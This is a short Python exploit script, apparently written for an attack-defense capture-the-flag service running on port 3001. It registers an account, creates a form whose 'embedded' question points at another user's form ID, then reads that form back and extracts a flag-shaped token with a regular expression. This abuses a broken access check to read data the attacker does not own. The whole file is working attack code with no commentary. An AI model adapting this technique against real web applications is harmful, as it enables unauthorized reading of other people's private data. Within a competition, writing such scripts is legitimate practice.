from utils import *
import sys
import json
import re

PORT = 3001


def exploit(ip, flag_id):
    client = ClientSession(ip, PORT)
    client.register()

    cred = client.export_credentials()

    form = {
        "title": random_string(5, 20),
        "questions": [{"type": "embedded", "data": {"id": flag_id["form_id"]}}],
    }

    form = client.new_form(form=form)

    form_g = client.get_form(form["id"])

    m = re.search(r"[A-Z0-9]{31}=", json.dumps(form_g))
    if m is None:
        raise Exception("Failed to find flag in " + json.dumps(form_g))
    
    flag = m.group(0)
    return flag


if __name__ == "__main__":
    ip = sys.argv[1]
    flag_id = json.loads(sys.argv[2])
    print(exploit(ip, flag_id))
